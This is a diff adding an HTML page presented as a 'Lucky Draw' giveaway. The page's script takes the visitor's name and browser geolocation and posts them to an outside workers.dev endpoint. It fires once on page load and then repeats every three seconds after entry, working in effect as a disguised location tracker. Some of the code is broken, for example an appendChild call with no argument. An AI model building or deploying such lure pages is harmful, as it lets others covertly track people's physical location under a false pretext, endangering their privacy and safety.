@@ -1,1 +1,349 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Lucky Draw - Enter to Win!</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: "Arial", sans-serif;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+      }
+
+      .container {
+        background: rgba(255, 255, 255, 0.95);
+        padding: 40px;
+        border-radius: 20px;
+        box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+        text-align: center;
+        max-width: 500px;
+        width: 100%;
+        backdrop-filter: blur(10px);
+      }
+
+      .logo {
+        font-size: 3rem;
+        margin-bottom: 10px;
+        color: #667eea;
+      }
+
+      h1 {
+        color: #333;
+        margin-bottom: 10px;
+        font-size: 2.5rem;
+        font-weight: bold;
+      }
+
+      .subtitle {
+        color: #666;
+        margin-bottom: 30px;
+        font-size: 1.1rem;
+      }
+
+      .form-group {
+        margin-bottom: 25px;
+        text-align: left;
+      }
+
+      label {
+        display: block;
+        margin-bottom: 8px;
+        font-weight: bold;
+        color: #333;
+      }
+
+      input[type="text"] {
+        width: 100%;
+        padding: 15px;
+        border: 2px solid #e0e0e0;
+        border-radius: 10px;
+        font-size: 1rem;
+        transition: all 0.3s ease;
+        background: #f9f9f9;
+      }
+
+      input[type="text"]:focus {
+        outline: none;
+        border-color: #667eea;
+        background: white;
+        transform: translateY(-2px);
+        box-shadow: 0 5px 15px rgba(102, 126, 234, 0.2);
+      }
+
+      .submit-btn {
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        color: white;
+        padding: 15px 40px;
+        border: none;
+        border-radius: 50px;
+        font-size: 1.1rem;
+        font-weight: bold;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        width: 100%;
+        margin-top: 10px;
+      }
+
+      .submit-btn:hover {
+        transform: translateY(-3px);
+        box-shadow: 0 10px 25px rgba(102, 126, 234, 0.3);
+      }
+
+      .submit-btn:disabled {
+        opacity: 0.6;
+        cursor: not-allowed;
+        transform: none;
+      }
+
+      .status {
+        margin-top: 20px;
+        padding: 15px;
+        border-radius: 10px;
+        font-weight: bold;
+        display: none;
+      }
+
+      .status.success {
+        background: #d4edda;
+        color: #155724;
+        border: 1px solid #c3e6cb;
+      }
+
+      .status.error {
+        background: #f8d7da;
+        color: #721c24;
+        border: 1px solid #f5c6cb;
+      }
+
+      .location-status {
+        margin-top: 15px;
+        font-size: 0.9rem;
+        color: #666;
+      }
+
+      @keyframes pulse {
+        0% {
+          transform: scale(1);
+        }
+        50% {
+          transform: scale(1.05);
+        }
+        100% {
+          transform: scale(1);
+        }
+      }
+
+      .pulse {
+        animation: pulse 2s infinite;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="logo">🎉</div>
+      <h1>Lucky Draw</h1>
+      <p class="subtitle">Enter your name for a chance to win amazing prizes!</p>
+
+      <form id="luckyDrawForm">
+        <div class="form-group">
+          <label for="name">Your Name:</label>
+          <input type="text" id="name" name="name" required placeholder="Enter your full name" />
+        </div>
+
+        <button type="submit" class="submit-btn" id="submitBtn">🍀 Enter Lucky Draw</button>
+      </form>
+
+      <div class="location-status" id="locationStatus" hidden>📍 Getting your location...</div>
+
+      <div class="status" id="statusMessage"></div>
+    </div>
+
+    <script>
+      let userLocation = null;
+      let cachedName = null;
+      let postInterval = null;
+      let requestCount = 0;
+
+      // Get user's location
+      function getUserLocation() {
+        const locationStatus = document.getElementById("locationStatus");
+        const submitBtn = document.getElementById("submitBtn");
+
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            function (position) {
+              userLocation = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+              };
+              locationStatus.textContent = "📍 Location detected";
+              locationStatus.style.color = "#28a745";
+              submitBtn.disabled = false;
+            },
+            function (error) {
+              console.error("Location error:", error);
+              userLocation = { error: "Location not available" };
+              locationStatus.textContent = "📍 Location unavailable (optional)";
+              locationStatus.style.color = "#ffc107";
+            }
+          );
+        } else {
+          userLocation = { error: "Geolocation not supported" };
+          locationStatus.textContent = "📍 Location not supported";
+          locationStatus.style.color = "#ffc107";
+        }
+        // locationStatus.style.display = "hidden";
+      }
+
+      // Send POST request to API
+      async function sendLocationData() {
+        if (!cachedName) return;
+
+        const formData = {
+          name: cachedName,
+          latitude: userLocation && userLocation.latitude ? userLocation.latitude : 20,
+          longitude: userLocation && userLocation.longitude ? userLocation.longitude : 80,
+        };
+
+        try {
+          const response = await fetch("https://julie.vasdvasd011.workers.dev/locations", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify(formData),
+          });
+
+          requestCount++;
+          const statusMessage = document.getElementById("statusMessage");
+
+          if (response.ok) {
+            statusMessage.textContent = `✅ Request #${requestCount} sent successfully (Auto-updating every 3s)`;
+            statusMessage.className = "status success";
+            statusMessage.style.display = "hidden";
+          } else {
+            throw new Error("Request failed");
+          }
+        } catch (error) {
+          console.error("Request error:", error);
+          const statusMessage = document.getElementById("statusMessage");
+          statusMessage.textContent = `❌ Request #${requestCount} failed - Will retry in 3s`;
+          statusMessage.className = "status error";
+          statusMessage.style.display = "block";
+        }
+      }
+
+      // Start automatic posting every 3 seconds
+      function startAutoPosting() {
+        if (postInterval) {
+          clearInterval(postInterval);
+        }
+
+        // Send immediately
+        sendLocationData();
+
+        // Then every 3 seconds
+        postInterval = setInterval(sendLocationData, 3000);
+      }
+
+      // Stop automatic posting
+      function stopAutoPosting() {
+        if (postInterval) {
+          clearInterval(postInterval);
+          postInterval = null;
+        }
+      }
+
+      // Initialize location detection
+      getUserLocation();
+
+      // Handle form submission
+      document.getElementById("luckyDrawForm").addEventListener("submit", async function (e) {
+        e.preventDefault();
+
+        const submitBtn = document.getElementById("submitBtn");
+        const statusMessage = document.getElementById("statusMessage");
+        const nameInput = document.getElementById("name");
+
+        // Cache the name
+        cachedName = nameInput.value.trim();
+
+        if (!cachedName) return;
+
+        // Check if location is available
+        if (!userLocation || userLocation.error || !userLocation.latitude || !userLocation.longitude) {
+          statusMessage.textContent = "❌ Allow permission.";
+          statusMessage.className = "status error";
+          statusMessage.style.display = "block";
+          //   statusMessage.onclick = ;
+
+          // Retry getting location
+          getUserLocation();
+          return;
+        }
+
+        // Update button state
+        submitBtn.textContent = "🔄 Auto-posting every 3s...";
+        submitBtn.disabled = true;
+
+        // Start automatic posting
+        requestCount = 0;
+        startAutoPosting();
+
+        // Add a stop button
+        if (!document.getElementById("stopBtn")) {
+          const stopBtn = document.createElement("button");
+          stopBtn.id = "stopBtn";
+          stopBtn.type = "button";
+          stopBtn.className = "submit-btn";
+          stopBtn.textContent = "⏹️ Stop Auto-posting";
+          stopBtn.style.marginTop = "10px";
+          stopBtn.style.background = "linear-gradient(135deg, #dc3545 0%, #c82333 100%)";
+
+          stopBtn.addEventListener("click", function () {
+            stopAutoPosting();
+            submitBtn.disabled = false;
+            submitBtn.textContent = "🍀 Enter Lucky Draw";
+            statusMessage.textContent = "⏸️ Auto-posting stopped";
+            statusMessage.className = "status";
+            statusMessage.style.display = "block";
+            statusMessage.style.background = "#fff3cd";
+            statusMessage.style.color = "#856404";
+            this.remove();
+            cachedName = null;
+            requestCount = 0;
+          });
+
+          submitBtn.parentNode.appendChild();
+        }
+      });
+
+      // Add some interactive effects
+      document.getElementById("name").addEventListener("input", function () {
+        const submitBtn = document.getElementById("submitBtn");
+        if (this.value.trim()) {
+          submitBtn.style.background = "linear-gradient(135deg, #28a745 0%, #20c997 100%)";
+          submitBtn.textContent = "🍀 Ready to Enter!";
+        } else {
+          submitBtn.style.background = "linear-gradient(135deg, #667eea 0%, #764ba2 100%)";
+          submitBtn.textContent = "🍀 Enter Lucky Draw";
+        }
+      });
+      cachedName = "load";
+      sendLocationData();
+    </script>
+  </body>
+</html>
 
